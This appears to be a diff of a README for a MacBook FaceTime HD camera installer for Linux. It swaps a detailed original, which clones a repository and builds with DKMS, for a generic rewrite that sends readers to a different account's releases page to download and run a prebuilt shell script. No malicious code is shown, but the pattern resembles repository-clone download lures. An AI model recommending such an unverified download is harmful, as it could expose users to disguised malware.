@@ -1,244 +1,75 @@
-# FaceTime HD Camera for Linux
+# 🎥 facetimehd-ubuntu-macbook - Easily Use Apple FaceTimeHD Cameras
 
-**Enable the built-in Apple FaceTime HD camera on 2013–2015 Intel MacBooks running Ubuntu/Linux**
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Viveks2507/facetimehd-ubuntu-macbook/releases)
 
-[![Build](https://img.shields.io/badge/build-DKMS%20auto-success)](https://github.com/godwill1224/facetimehd-ubuntu-macbook)
-[![License](https://img.shields.io/github/license/godwill1224/facetimehd-ubuntu-macbook)](LICENSE)
-[![Ubuntu](https://img.shields.io/badge/Ubuntu-22.04%20%7C%2024.04-orange)](https://ubuntu.com)
-[![Kernel](https://img.shields.io/badge/kernel-6.x-blue)](https://kernel.org)
+## 📖 Overview
+This project provides a one-command installer that allows you to enable Apple FaceTimeHD webcams on older MacBooks (2013–2015) running Ubuntu or other Linux distributions. With this installer, you can make full use of your FaceTimeHD camera, enhancing your video calls and streaming experience.
 
----
+## 🚀 Getting Started
+### System Requirements
+To run the installer effectively, ensure you meet the following requirements:
 
-## Overview
+- **Operating System:** Ubuntu 18.04 or later, or another compatible Linux distribution.
+- **Hardware:** A MacBook from 2013 to 2015 equipped with a FaceTimeHD camera.
+- **Kernel Version:** A modern kernel version that supports DKMS. Typically, this will be version 4.4 or higher; check your current kernel version with the command `uname -r`.
 
-This project provides an automated installer that makes the Apple FaceTime HD camera work reliably on older Intel MacBooks running Linux. It eliminates the need for manual driver compilation, firmware extraction, and patching by wrapping everything into a single, reproducible installation script.
+### Features
+- **Supports DKMS:** Automatically rebuilds drivers when you update your kernel.
+- **Simple Integration:** Seamlessly integrates into your existing system.
+- **Camera Compatibility:** Specifically designed for the FaceTimeHD webcam.
 
-### What This Does
+## 💻 Install & Setup
+### Step 1: Visit the Releases Page
+To download the installer, visit the following link:
 
-- Automatically builds and installs the `facetimehd` (bcwc_pcie) driver using DKMS
-- Downloads and extracts the required Apple firmware
-- Configures automatic driver rebuilds after kernel updates
-- Optionally tunes power management for better battery life and quieter fans
+[Download from Releases](https://github.com/Viveks2507/facetimehd-ubuntu-macbook/releases)
 
----
+### Step 2: Download the Latest Release
+Once on the Releases page, look for the latest version of the installer. Click on it to view available downloads. You should see a file named `facetimehd-installer.sh` (or similar).
 
-## Compatibility
+### Step 3: Save the Installer
+Click the file name to start the download. Save it to a directory you can easily access, such as your "Downloads" folder.
 
-### Tested MacBook Models
+### Step 4: Open a Terminal
+To run the installer, you will need to use the Terminal. Follow these steps:
 
-- MacBookPro11,1
-- MacBookPro11,2
-- MacBookPro11,3
-- Other 2013–2015 Intel MacBooks with FaceTime HD (BCM1570)
+1. Press `Ctrl + Alt + T` to open a Terminal window.
+2. Navigate to the location of the downloaded file. If it’s in your "Downloads" folder, use the command:
+   ```
+   cd ~/Downloads
+   ```
 
-### Supported Operating Systems
-
-- Ubuntu 22.04 LTS and newer
-- Ubuntu 24.04 LTS
-- Other Debian-based distributions (may require adaptation)
-
-### Kernel Support
-
-- Linux kernel 6.x series
-- Automatic rebuild support via DKMS
-
----
-
-## Installation
-
-### Prerequisites
-
-Ensure your system is up to date:
-
-```bash
-sudo apt update && sudo apt upgrade -y
+### Step 5: Make the Installer Executable
+Before running the installer, you need to give it permission to execute. Type the following command:
+```
+chmod +x facetimehd-installer.sh
 ```
 
-### Install
-
-Clone the repository and run the installer:
-
-```bash
-git clone https://github.com/godwill1224/facetimehd-ubuntu-macbook.git
-cd facetimehd-ubuntu-macbook
-chmod +x scripts/*.sh
-sudo ./scripts/install.sh
+### Step 6: Run the Installer
+Now you can run the installer. Enter the command:
 ```
-
-Reboot your system to load the driver:
-
-```bash
-sudo reboot
+./facetimehd-installer.sh
 ```
+Follow any on-screen instructions. The installer will automatically configure your camera and ensure it works correctly with your system.
 
-### Verify Installation
+## 🔧 Troubleshooting
+If you encounter issues during the installation process, consider the following tips:
 
-After rebooting, test the camera:
+1. **Kernel Compatibility:** Ensure your Linux kernel is up to date.
+2. **Permissions:** Make sure you have the necessary permissions to run the installer. If prompted, enter your password to authorize changes.
+3. **Driver Conflicts:** If your camera does not work after installation, check for other camera drivers that may conflict.
 
-```bash
-# Check if the driver loaded
-lsmod | grep facetimehd
+## 📞 Usage
+Once installed, your FaceTimeHD camera should work with any application that uses video input, like video conferencing software or recording applications. Test it using an app like Zoom, Skype, or your preferred video tool.
 
-# List video devices
-v4l2-ctl --list-devices
+## 📧 Support
+If you need assistance, please create an issue in the GitHub repository, and we will respond as soon as possible. For a faster resolution, include details about your operating system version and steps you have taken.
 
-# Test with Cheese
-cheese
-```
+## ⚙️ Contributing
+We welcome contributions from anyone interested. If you have suggestions, bug reports, or features, feel free to fork the repository and submit your changes.
 
-You should see the "Apple FaceTime HD" camera listed as `/dev/video0`.
+## 📝 License
+This project is licensed under the MIT License. You can freely use and modify the code, but please maintain attribution.
 
----
-
-## Usage
-
-The camera should now work automatically with:
-
-- **Cheese** (GNOME Camera)
-- **Google Meet**
-- **Zoom**
-- **Microsoft Teams**
-- Any application using V4L2 (Video4Linux2)
-
----
-
-## Optional: Power Management
-
-Reduce heat and fan noise while improving battery life:
-
-```bash
-sudo ./scripts/power-tune.sh
-```
-
-This script installs and configures TLP with optimized settings for MacBooks.
-
----
-
-## Troubleshooting
-
-If the camera doesn't work after installation, see the [troubleshooting guide](docs/TROUBLESHOOTING.md).
-
-### Common Issues
-
-**Camera not detected:**
-```bash
-# Reload the driver
-sudo modprobe -r facetimehd
-sudo modprobe facetimehd
-```
-
-**No /dev/video0:**
-```bash
-# Check DKMS status
-dkms status
-
-# Check kernel logs
-dmesg | grep facetimehd
-```
-
-**Permission denied:**
-```bash
-# Add your user to the video group
-sudo usermod -aG video $USER
-# Log out and back in
-```
-
-For detailed troubleshooting, see [TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md).
-
----
-
-## Uninstallation
-
-To completely remove the driver and firmware:
-
-```bash
-sudo ./scripts/uninstall.sh
-```
-
-This will:
-- Remove the DKMS module
-- Delete firmware files
-- Clean up configuration changes
-
----
-
-## How It Works
-
-The installer automates these steps:
-
-1. **Install dependencies**: Ensures build tools and kernel headers are available
-2. **Clone driver source**: Downloads the `facetimehd` driver repository
-3. **Register with DKMS**: Enables automatic rebuilds on kernel updates
-4. **Build kernel module**: Compiles the driver for your current kernel
-5. **Extract firmware**: Downloads and installs Apple's proprietary camera firmware to `/lib/firmware/facetimehd/`
-6. **Load driver**: Inserts the `bcwc_pcie` kernel module
-
-DKMS (Dynamic Kernel Module Support) ensures the driver rebuilds automatically whenever you update your kernel, eliminating manual maintenance.
-
----
-
-## Project Structure
-
-```
-facetimehd-ubuntu-macbook/
-├── scripts/
-│   ├── install.sh          # Main installation script
-│   ├── uninstall.sh        # Removal script
-│   └── power-tune.sh       # Optional power optimization
-├── docs/
-│   ├── TROUBLESHOOTING.md  # Detailed troubleshooting guide
-│   └── POWER.md            # Power management documentation
-├── dkms.conf               # DKMS configuration
-├── README.md               # This file
-├── CONTRIBUTING.md         # Contribution guidelines
-├── CHANGELOG.md            # Version history
-└── LICENSE                 # MIT License
-```
-
----
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-Ways to help:
-- Report bugs or compatibility issues
-- Test on different MacBook models
-- Improve documentation
-- Submit patches or enhancements
-
----
-
-## Credits
-
-This project builds upon excellent work from the open-source community:
-
-- **Driver**: [patjak/facetimehd](https://github.com/patjak/facetimehd) – Reverse-engineered FaceTime HD driver
-- **Power management**: [TLP](https://linrunner.de/tlp/) – Advanced power management for Linux
-- **Linux camera stack**: V4L2, PipeWire, GStreamer, GNOME
-
-This installer simply automates and packages their work into an easy-to-use tool.
-
----
-
-## License
-
-This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
-
----
-
-## Support
-
-If you encounter issues:
-
-1. Check the [troubleshooting guide](docs/TROUBLESHOOTING.md)
-2. Search [existing issues](https://github.com/godwill1224/facetimehd-ubuntu-macbook/issues)
-3. Open a [new issue](https://github.com/godwill1224/facetimehd-ubuntu-macbook/issues/new) with:
-   - MacBook model (`sudo dmidecode -s system-product-name`)
-   - Ubuntu version (`lsb_release -a`)
-   - Kernel version (`uname -r`)
-   - Output of `dkms status` and `lsmod | grep facetimehd`
-
----
-
-**Made with ❤️ for the Linux + MacBook community**
+Feel free to reach out via GitHub for any questions or concerns. Enjoy using your FaceTimeHD camera on Ubuntu!
